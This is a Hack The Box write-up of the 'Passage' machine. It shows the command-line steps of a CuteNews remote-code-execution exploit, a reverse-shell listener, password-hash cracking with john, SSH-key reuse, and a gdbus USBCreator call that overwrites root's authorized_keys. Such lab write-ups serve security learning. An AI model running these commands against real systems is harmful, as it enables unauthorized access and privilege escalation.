---
layout: post
title: "Hack The Box - Passage Writeup"
author: Chr0x6eOs
date: "2021-03-06"
subject: "Passage Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux, CMS, Metasploit, D-Bus]
lang: "en"
image:
    path: assets/htb/Passage/logo.png
    width: 300
    height: 300
...

![Passage](/assets/htb/Passage/passage.png)

[Passage](https://www.hackthebox.eu/home/machines/profile/275) is a medium linux box by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 

### Overview

The box starts with web-enumeration, where we find an installation of CuteNews CMS. Some research reveals a RCE vulnerability, which we exploit to both get a shell and leak the password-hashes of all users. Cracking the hashes, we get a password, which we use to switch to user and read user.txt.

Next, we enumerate the system as paul, finding that the ssh-keys were created by the more privileged user nadav.  Using the ssh-keys we can login as nadav, where we further enumerate the system. The .viminfo file of nadav hints us towards D-Bus, where we have a arbitrary file read&write in the context of root. We use this to escalate our privilege to root by overwriting root's authorized_keys file. With this we are able to login via ssh as the user root and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.206
Nmap scan report for 10.10.10.206
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The open ports shown are **22** (ssh) and **80** (http). SSH is usually not that interesting without credentials, so let us start our enumeration with port 80.

### HTTP - Port 80

Going to http://10.10.10.206, we get following webpage:

![Index webpage](/assets/htb/Passage/http/index-webpage.png)

Clicking on the first article, we get redirected to http://10.10.10.206/index.php?id=11, which gives us following webpage.

![Article webpage](/assets/htb/Passage/http/article-webpage.png)

At the bottom of the article we see `Powered by CuteNews` which seems to be the software in use. Clicking on the link, we can get to the [GitHub repository of the CMS](https://github.com/CuteNews/cutenews-2.0). Looking at the commit-date, it seems like this project hasn't been updated since Nov 1, 2018. This means it is likely that there are published exploits for this CMS. Let us do a quick [Google search](https://www.google.com/search?&q=CuteNews+exploit). Seems like CuteNews 2.1.2 suffers from a remote-code-execution vulnerability ([CVE-2019-11447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11447)). There is a [Metasploit module](https://www.exploit-db.com/exploits/46698), as well as other POCs available. 

I am going to use [this exploit](https://www.exploit-db.com/exploits/48800) from exploit-db. I made some small modifications so the script runs without user-input and added a reverse-shell payload instead of the interactive webshell.

## Initial access - CVE-2019-11447

In order to get our shell, we simply need to listen for our reverse-shell and run the exploit.

```bash
root@darkness:~# python3 exploit.py 



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: DBouVPIQBE and password: DBouVPIQBE

=======================================================
Sending Payload
=======================================================
============================
Dropping to a SHELL
============================
```

```bash
root@darkness:~# nc -lnvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:55710.
bash: cannot set terminal process group (1720): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$
```

We successfully execute the exploit and get a shell. A nice feature of this exploit, is the extraction of the password-hashes of the users. Let us try to crack these hashes.

### Cracking the user-hashes

```bash
root@darkness:~# john hashes.txt -w=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
atlanta1         (?)
1g 0:00:00:01 DONE (2021-01-13 10:42) 0.9009g/s 12921Kp/s 12921Kc/s 51746KC/s -sevim-..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

Seems like we have successfully cracked one of the passwords to be `atlanta1`. 

### Privesc to user

Let us upgrade our shell and try to use the password.

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml/CuteNews/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'        
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@darkness:~# stty raw -echo
nc -lnvp 443s:~# 

www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
```

Now our shell is fully upgraded and we can check /etc/passwd to see which users are available on the system.

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
```

Seems like we have three users: `root`, `nadav` and `paul`. Let us try to use the password to su to each user.

```bash
www-data@passage:/var/www$ su root
Password: atlanta1
su: Authentication failure
www-data@passage:/var/www$ su nadav
Password: atlanta1
su: Authentication failure
www-data@passage:/var/www$ su paul
Password: atlanta1
paul@passage:/var/www$
```

Seems like the password works for the user `paul`. Checking out his home-directory, we can see that we have access to user.txt.

```bash
paul@passage:~$ cat user.txt 
8b12f***************************
```

## Privesc - Root

Now that we have user, let us enumerate the system to find a privesc-vector to root.

### Enumeration as paul

Let us start our enumeration by looking at our home-directory in more detail.

```bash
paul@passage:~$ ls -alh
total 112K
drwxr-x--- 16 paul paul 4.0K Sep  2 07:18 .
drwxr-xr-x  4 root root 4.0K Jul 21 10:43 ..
----------  1 paul paul    0 Jul 21 10:44 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3.7K Jul 21 10:44 .bashrc
drwx------ 10 paul paul 4.0K Sep  1 02:10 .cache
drwx------ 14 paul paul 4.0K Aug 24 07:12 .config
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Desktop
-rw-r--r--  1 paul paul   25 Aug 24 07:11 .dmrc
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Documents
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Downloads
-rw-r--r--  1 paul paul 8.8K Apr 20  2016 examples.desktop
drwx------  2 paul paul 4.0K Aug 24 07:13 .gconf
drwx------  3 paul paul 4.0K Sep  2 07:19 .gnupg
-rw-------  1 paul paul 1.3K Sep  2 07:18 .ICEauthority
drwx------  3 paul paul 4.0K Aug 24 07:11 .local
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Music
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Public
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:43 .ssh
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Templates
-r--------  1 paul paul   33 Jan 13 01:21 user.txt
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Videos
-rw-------  1 paul paul   52 Sep  2 07:18 .Xauthority
-rw-------  1 paul paul 1.2K Sep  2 07:19 .xsession-errors
-rw-------  1 paul paul 1.4K Sep  1 04:20 .xsession-errors.old
```

The `.ssh` is always very interesting! Let us take a closer look.

```bash
paul@passage:~/.ssh$ ssh-keygen -l -f id_rsa
2048 SHA256:0CLuXax7B8qH74W3/h0JeUQLzXgK4kksJtElMCblFAw nadav@passage (RSA)
paul@passage:~/.ssh$ ssh-keygen -l -f id_rsa.pub 
2048 SHA256:0CLuXax7B8qH74W3/h0JeUQLzXgK4kksJtElMCblFAw nadav@passage (RSA)
paul@passage:~/.ssh$ ssh-keygen -l -f authorized_keys 
2048 SHA256:0CLuXax7B8qH74W3/h0JeUQLzXgK4kksJtElMCblFAw nadav@passage (RSA)
```

Interestingly the ssh-files seem to be created by the user `nadava@passage`. Maybe the keys will also work for the creator. Let us try to use the ssh-key to login as the user `nadav`.

```bash
paul@passage:~$ ssh nadav@passage
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$
```

We successfully login via ssh to the user nadav.

### Enumeration as nadav

Again, let us check out the user-directory.

```bash
nadav@passage:~$ ls -alh
total 116K
drwxr-x--- 17 nadav nadav 4.0K Jan 13 01:21 .
drwxr-xr-x  4 root  root  4.0K Jul 21 10:43 ..
----------  1 nadav nadav    0 Jul 21 10:45 .bash_history
-rw-r--r--  1 nadav nadav  220 Jun 18  2020 .bash_logout
-rw-r--r--  1 nadav nadav 3.8K Jul 21 10:44 .bashrc
drwx------ 12 nadav nadav 4.0K Jul 21 10:47 .cache
drwx------ 14 nadav nadav 4.0K Jun 18  2020 .config
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Desktop
-rw-r--r--  1 nadav nadav   25 Jun 18  2020 .dmrc
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Documents
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Downloads
-rw-r--r--  1 nadav nadav 8.8K Jun 18  2020 examples.desktop
drwx------  2 nadav nadav 4.0K Jun 18  2020 .gconf
drwx------  3 nadav nadav 4.0K Jan 13 01:21 .gnupg
-rw-------  1 nadav nadav 3.5K Jan 13 01:21 .ICEauthority
drwx------  3 nadav nadav 4.0K Jun 18  2020 .local
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Music
drwxr-xr-x  2 nadav nadav 4.0K Aug 31 14:06 .nano
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Pictures
-rw-r--r--  1 nadav nadav  655 Jun 18  2020 .profile
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Public
drwx------  2 nadav nadav 4.0K Jul 21 10:43 .ssh
-rw-r--r--  1 nadav nadav    0 Jun 18  2020 .sudo_as_admin_successful
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Templates
drwxr-xr-x  2 nadav nadav 4.0K Jun 18  2020 Videos
-rw-------  1 nadav nadav 1.4K Jul 21 10:44 .viminfo
-rw-------  1 nadav nadav  103 Jan 13 01:21 .Xauthority
-rw-------  1 nadav nadav   82 Jan 13 01:21 .xsession-errors
-rw-------  1 nadav nadav 1.5K Sep  2 07:19 .xsession-errors.old
```

`.viminfo` is always an interesting file.

```bash
nadav@passage:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        "       12      7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        "       2       0
        .       2       0
        +       2       0
```

Seems like `/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf` was edited using vim. Let us see, if we have permission to read this file.

```bash
nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>

  <!-- Only root can own the service -->
  <policy user="root">
    <allow own="com.ubuntu.USBCreator"/>
  </policy>

  <!-- Allow anyone to invoke methods (further constrained by
       PolicyKit privileges -->
  <policy context="default">
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="com.ubuntu.USBCreator"/>
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="org.freedesktop.DBus.Introspectable"/>
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="org.freedesktop.DBus.Properties"/>
  </policy>

</busconfig>
```

Let us do a [quick Google- search](https://www.google.com/search?q=usbcreator+dbus+privesc) and see, if there is privesc-potential in this configuration. The search gives an interesting article: [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/). 

The article perfectly fits our target.

```bash
nadav@passage:~$ hostnamectl
   Static hostname: passage
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 4a23f1f5846e4890b0997d28c0fdd9e3
           Boot ID: a69a367dec7743d6bb35d4ad4c2db116
    Virtualization: vmware
  Operating System: Ubuntu 16.04.6 LTS
            Kernel: Linux 4.15.0-45-generic
      Architecture: x86-64
```

We are running Ubuntu 16.04.

As can be seen in this picture of the article, we can arbitrary copy files from and to any location in the context of root (which gives us read&write access to the entire fs).

![Privesc: https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-30.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-30.png)

### Exploiting D-Bus

Let us try to overwrite the root authorized_keys-file with the authorized_keys-file of nadav.

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true
()
```

If this exploit was success, we should be able to ssh into the machine as root.

```bash
nadav@passage:~$ ssh root@passage
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~#
```

We successfully ssh in as root and can now read root.txt.

```bash
root@passage:~# cat root.txt 
2e1af***************************
```
